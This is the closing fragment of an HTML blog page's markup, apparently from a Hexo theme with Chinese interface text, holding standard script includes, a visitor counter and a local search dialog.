class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
